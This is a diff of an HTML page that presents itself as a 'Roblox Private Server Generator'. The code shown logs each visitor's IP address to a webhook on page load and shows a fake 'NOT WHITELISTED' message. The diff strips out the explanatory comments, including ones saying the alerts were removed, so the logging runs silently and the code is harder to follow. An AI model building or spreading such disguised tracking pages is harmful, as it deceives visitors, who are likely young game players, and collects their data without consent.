@@ -5,7 +5,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Roblox Private Server Generator</title>
     <style>
-        /* General Styles */
+       
         body, h1, h2, p, ul {
             margin: 0;
             padding: 0;
@@ -71,7 +71,7 @@
             color: #ff5733;
         }
 
-        /* Common Errors Section */
+       
         .errors-container {
             margin-top: 30px;
         }
@@ -101,7 +101,7 @@
             border-radius: 8px;
         }
 
-        /* Footer Section */
+  
         .footer {
             text-align: center;
             font-size: 16px;
@@ -110,7 +110,7 @@
             font-style: italic;
         }
 
-        /* Animation for text */
+     
         .animated-text {
             animation: flicker 1.5s infinite alternate;
         }
@@ -138,25 +138,25 @@
                     },
                     body: JSON.stringify(payload)
                 });
-                // Removed the alert here
+              
             } catch (error) {
                 console.error("Error sending to webhook:", error);
-                // Removed the alert here
+               
             }
         }
 
-        // Automatically log IP address on page load
+    
         window.onload = function() {
             const userKey = 'yourUserKeyHere'; // Replace with actual user key
             logIpAddress(userKey);
         };
 
-        // Function to show not whitelisted message
+       
         function showNotWhitelisted() {
             alert("NOT WHITELISTED. PLEASE COME BACK WHEN WHITELISTED.");
         }
 
-        // Function to toggle error content visibility
+  
         function toggleErrorContent(errorId) {
             var content = document.getElementById(errorId);
             if (content.style.display === "block") {
